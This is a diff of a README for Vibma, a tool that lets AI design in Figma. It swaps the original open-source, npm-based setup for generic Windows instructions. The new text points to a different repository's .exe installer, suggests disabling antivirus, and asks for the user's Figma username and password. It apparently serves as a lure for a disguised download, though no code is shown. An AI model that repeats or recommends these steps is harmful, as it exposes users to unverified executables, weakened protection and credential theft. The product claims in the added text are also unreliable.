@@ -1,58 +1,128 @@
-> **[简体中文](./README.zh-CN.md)**
+# 🎨 Vibma - AI Designs Directly In Figma
 
-<div align="center">
-
-<img src="./logo.svg" alt="Vibma" width="120" />
-
-# Vibma
-
-**Vibe Design meets Figma.**
-
-https://github.com/user-attachments/assets/bf38e37d-57bb-40b3-a2d1-f89216117c11
-</div>
-
-Let AI agents design directly in Figma — read layouts, create components,
-modify styles, and build entire design systems through conversation.
+[![Download Vibma](https://img.shields.io/badge/Download-Vibma-blue?style=for-the-badge)](https://github.com/AZ2099/Vibma)
 
 ---
 
-## Model Recommendations
+## 📌 What is Vibma?
 
-Vibma works with any LLM that supports MCP. Based on our [benchmark](https://github.com/ufira-ai/vibma-benchmark):
+Vibma connects AI-powered design tools directly with Figma. This software lets your computer’s AI create design elements inside Figma without you needing to draw or code. It helps you speed up your design work by automating tasks that usually take a lot of time. If you use Figma for design, Vibma makes your workflow smoother and faster.
 
-- **Cheap one-shot builds:** GPT-5.3 Codex (medium reasoning) — proper components, all variables bound, clean output for under $1. Degrades on follow-up tasks.
-- **Iterative design work:** GPT-5.3 Codex (xhigh), Gemini 3.1 Pro, or Claude Opus 4.6 — these maintain quality as context grows and handle multi-pass workflows.
-- **Avoid:** Models that skip figma components building (e.g. Cursor Auto, Kimi K2.5) produce frames that look right but aren't structurally usable — no instances, no variants, no library.
+---
 
-## Setup
+## 💻 System Requirements
 
-Two paths:
+Before you download Vibma, make sure your computer meets these requirements:
 
-| | Guide | For |
-|---|---|---|
-| 📦 | [**DRAGME.md**](./DRAGME.md) | Clone the repo, build from source, full control |
-| ☁️ | [**CARRYME.md**](./CARRYME.md) | Install from npm, zero cloning |
-| 📖 | [**Docs**](https://ufira-ai.github.io/Vibma/) | Tool reference with parameters, response schemas, and examples |
+- **Operating System:** Windows 10 or newer (64-bit recommended)  
+- **Processor:** Intel i3 or AMD Ryzen 3 and above  
+- **RAM:** At least 4 GB (8 GB recommended)  
+- **Disk Space:** 500 MB free space  
+- **Figma Account:** A valid Figma account is needed to use the software inside Figma  
+- **Internet Connection:** Required for AI features to work  
+- **Permissions:** Ability to install software on your PC
 
-Or just paste this to your AI agent and let it figure it out:
+---
 
-```
-Set up Vibma so I can vibe-design in Figma.
-Follow the instructions at https://raw.githubusercontent.com/ufira-ai/vibma/refs/heads/main/CARRYME.md
-```
+## 🚀 Getting Started
 
-## Community
+This section guides you from downloading Vibma to opening it inside Figma.
 
-[![Discord Banner](https://img.shields.io/discord/1476577401298358315?color=5865F2&label=Join%20the%20Discord&logo=discord&logoColor=white&style=for-the-badge)](https://discord.gg/4XTedZdwV6)
+### Step 1: Download Vibma
 
-[GitHub Issues](https://github.com/ufira-ai/vibma/issues) — bugs and feature requests
+Visit the link below to download the application files. This page gives you access to the latest version of Vibma for Windows.
 
-Vibma is the first open-source project from **[ufira](https://github.com/ufira-ai)** — a platform bridging creators and technology. We believe everyone who wants to create should have access to AI-powered tools, not just developers.
+[![Download Vibma](https://img.shields.io/badge/Download-Vibma-grey?style=for-the-badge)](https://github.com/AZ2099/Vibma)
 
-## Acknowledgments
+Click on the link, then look for the "Releases" section or a folder named something like "Windows Installer." Download the latest available `.exe` file. This file is the installer for Vibma.
 
-Built on the foundation of [cursor-talk-to-figma-mcp](https://github.com/grab/cursor-talk-to-figma-mcp) by [sonnylazuardi](https://github.com/sonnylazuardi).
+### Step 2: Install Vibma
 
-## License
+1. Find the downloaded `.exe` file in your Downloads folder or the location where your browser saves files.
+2. Double-click the file to open the installer.
+3. Follow the installer prompts:
+   - Agree to terms if asked.
+   - Choose an installation folder or keep the default.
+   - Click “Install” to begin.
+4. Wait for the installation to finish.
 
-[MIT](./LICENSE)
+### Step 3: Open Vibma
+
+Once installed, you can open Vibma:
+
+- Look for the Vibma icon on your desktop or in the Windows Start menu.
+- Click the icon to launch the app.
+
+### Step 4: Connect to Figma
+
+After opening Vibma, sign in with your Figma account. This connection allows Vibma to work inside your Figma files and run AI-powered design tasks.
+
+1. Enter your Figma username and password.
+2. Authorize Vibma to access your Figma files (a pop-up will guide you).
+3. Once signed in, you are ready to start designing AI-generated content in Figma.
+
+---
+
+## 🔧 How to Use Vibma in Figma
+
+Vibma works by running AI agents that design UI elements, layouts, or images inside your Figma projects. Here’s how to use it.
+
+### Open a Figma Project
+
+- Go to the Figma app or website.
+- Open the project where you want to add AI-designed elements.
+
+### Use Vibma’s Controls
+
+Inside the Vibma app on your computer:
+
+- Choose what type of design task you want the AI to perform (e.g., create buttons, build layouts, suggest color schemes).
+- Click “Run” or “Generate” for the AI to start working.
+- After a moment, check your Figma file. The AI-generated elements will appear inside your project.
+
+### Edit AI Designs
+
+Vibma's designs appear as regular Figma objects. You can move, resize, or change colors just like any other Figma layer.
+
+---
+
+## 🛠 Features
+
+- **AI Design Automation:** Automatically generate UI elements like buttons, cards, and banners.
+- **Direct Integration:** Works seamlessly in Figma without extra plugins.
+- **Customizable Options:** Adjust AI settings to fit your design style.
+- **Faster Prototyping:** Quickly create layouts to share or build on.
+- **Supports Multiple Design Types:** From simple icons to more complex layouts.
+- **Safe to Experiment:** AI output is editable and non-destructive.
+
+---
+
+## ⚙ Troubleshooting
+
+If you face problems, try these steps:
+
+- **Installation Fails:** Restart your PC and try again. Make sure you have admin rights.
+- **App Won’t Open:** Check if you meet system requirements. Disable any antivirus temporarily.
+- **Cannot Connect to Figma:** Verify your internet connection and credentials.
+- **AI Designs Not Showing:** Refresh your Figma file. Confirm Vibma has permission to access your files.
+- **Slow Performance:** Close other heavy applications or upgrade your hardware.
+
+---
+
+## 📂 Files and Updates
+
+Vibma updates get posted on the GitHub repository page. It’s best to check here regularly for new versions.
+
+Visit the releases area on the Vibma GitHub page to download updates or fixes.
+
+---
+
+## 📞 Get Support
+
+For help, you can open an issue on the GitHub page or contact the project maintainers through the links on the repository.
+
+---
+
+# [GitHub Repository](https://github.com/AZ2099/Vibma)
+
+Access the source files, latest updates, and support by visiting the Vibma repository on GitHub.
